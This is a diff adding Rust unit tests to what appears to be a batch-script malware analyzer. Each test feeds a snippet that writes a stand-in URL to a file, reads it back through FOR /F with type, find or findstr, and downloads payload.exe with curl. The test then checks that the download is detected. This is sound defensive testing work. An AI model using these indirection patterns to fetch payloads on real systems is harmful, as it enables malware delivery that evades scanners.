@@ -3596,6 +3596,51 @@ for /f "tokens=* delims=" %%U in ('more ^< url.txt') do curl -o payload.exe %%U"
     }
 
     #[test]
+    fn for_f_type_stdin_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-type-stdin.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('type ^< url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-type-stdin.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F type-stdin source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_find_stdin_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>url.txt
+echo https://for-f-find-stdin.example/payload.exe>>url.txt
+for /f "tokens=* delims=" %%U in ('find "https://" ^< url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-find-stdin.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F find-stdin source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_more_plus_reads_generated_file_source() {
         let report = analyze(
             br#"echo header>url.txt
@@ -3906,6 +3951,29 @@ for /f "tokens=* delims=" %%U in ('findstr /l "https://findstr-literal.example/[
                 )
             }),
             "FOR /F findstr /l literal URL was treated as regex: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_prefix_stdin_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://findstr-prefix-stdin.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('^< web.txt findstr /i "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-prefix-stdin.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr prefix-stdin source did not feed later curl: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
